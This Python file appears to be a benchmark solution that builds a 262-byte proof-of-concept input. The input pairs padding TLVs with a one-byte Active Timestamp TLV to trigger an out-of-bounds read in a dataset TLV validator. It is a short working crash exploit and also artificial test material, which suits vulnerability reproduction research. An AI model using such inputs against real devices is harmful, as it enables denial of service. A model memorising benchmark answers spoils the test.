import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is a missing minimum length check for certain TLVs in a
        dataset. Specifically, the Active Timestamp TLV (type 0x00) should have a
        value length of at least 8 bytes. The PoC provides a length of 1.

        When the vulnerable code processes this dataset, `IsTlvValid()` incorrectly
        approves it. Later, a processing function attempts to read the full 8 bytes
        for the timestamp from the 1-byte value field. Since the malicious TLV is
        placed at the end of the input, this results in an out-of-bounds read,
        which is detected by sanitizers as a stack buffer overflow, causing a crash.

        The PoC is crafted to be 262 bytes, matching the ground-truth length. This
        is achieved by prepending padding TLVs before the malicious one. This ensures
        the memory layout is conducive to triggering the crash reliably.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """

        # PoC structure: [Padding TLV 1] [Padding TLV 2] [Malicious TLV]
        # Total length: 257 + 2 + 3 = 262 bytes

        # TLV 1: A large, valid but unrecognized (vendor-specific) TLV for padding.
        # Type: 0x80, Length: 0xff (255), Value: 255 bytes
        tlv_padding_1 = b'\x80\xff' + (b'A' * 255)

        # TLV 2: A small, empty TLV to fine-tune the total length.
        # Type: 0x81, Length: 0x00, Value: 0 bytes
        tlv_padding_2 = b'\x81\x00'

        # TLV 3: The malicious Active Timestamp TLV.
        # Type: 0x00 (Active Timestamp)
        # Length: 0x01 (Vulnerable, should be >= 8)
        # Value: 1 byte
        tlv_malicious = b'\x00\x01\x42'

        poc = tlv_padding_1 + tlv_padding_2 + tlv_malicious
        
        return poc